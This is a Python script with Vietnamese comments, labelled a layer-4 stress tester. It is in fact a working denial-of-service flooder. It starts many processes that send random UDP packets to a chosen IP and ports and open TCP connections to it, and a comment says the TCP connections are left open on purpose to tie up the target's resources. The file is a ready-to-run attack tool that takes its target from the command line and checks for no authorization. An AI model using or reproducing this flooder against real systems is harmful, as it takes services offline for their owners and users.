import socket
import random
import sys
import time
from multiprocessing import Process, Value

# Cấu hình kỹ thuật
PACKET_SIZE = 1024 # Byte
CHUNKS = [random._urandom(1024) for _ in range(10)] # Tạo sẵn dữ liệu để đỡ tốn CPU tạo mới

class L4Tester:
    def __init__(self, target, ports, duration):
        self.target = target
        self.ports = ports
        self.duration = duration
        self.counter = Value('i', 0) # Bộ đếm chia sẻ giữa các tiến trình

    def udp_engine(self):
        """Tối ưu hóa gửi UDP ở mức tối đa"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Tăng kích thước bộ đệm gửi của hệ điều hành
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
        
        timeout = time.time() + self.duration
        while time.time() < timeout:
            try:
                port = random.choice(self.ports)
                data = random.choice(CHUNKS)
                sock.sendto(data, (self.target, port))
                self.counter.value += 1
            except:
                pass

    def tcp_engine(self):
        """Tối ưu hóa tạo kết nối TCP liên tục"""
        timeout = time.time() + self.duration
        while time.time() < timeout:
            try:
                port = random.choice(self.ports)
                # AF_INET = IPv4, SOCK_STREAM = TCP
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                # Thử kết nối nhưng không cần gửi dữ liệu (TCP SYN Flood mô phỏng)
                sock.connect((self.target, port))
                # Gửi một chút dữ liệu để giữ kết nối trong bảng trạng thái của đối phương
                sock.send(random.choice(CHUNKS))
                self.counter.value += 1
                # Không đóng ngay lập tức để giữ tài nguyên của đối phương
            except:
                pass

def run_stress_test(target, ports, threads, duration):
    tester = L4Tester(target, ports, duration)
    processes = []
    
    print(f"[*] Đang khởi chạy {threads} tiến trình L4...")
    
    # Chia đều tiến trình cho UDP và TCP
    for i in range(threads):
        target_func = tester.udp_engine if i % 2 == 0 else tester.tcp_engine
        p = Process(target=target_func)
        p.start()
        processes.append(p)

    # Theo dõi tiến độ
    start_time = time.time()
    while time.time() - start_time < duration:
        print(f"\r[+] Tốc độ hiện tại: {tester.counter.value} gói/kết nối thành công", end="")
        time.sleep(1)

    for p in processes:
        p.terminate()
    print("\n[!] Hoàn thành thử nghiệm L4.")

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("Sử dụng: python l4.py <IP> <Ports> <Processes> <Time>")
        sys.exit()

    target = sys.argv[1]
    ports = [int(p) for p in sys.argv[2].split(',')]
    procs = int(sys.argv[3])
    duration = int(sys.argv[4])

    run_stress_test(target, ports, procs, duration)

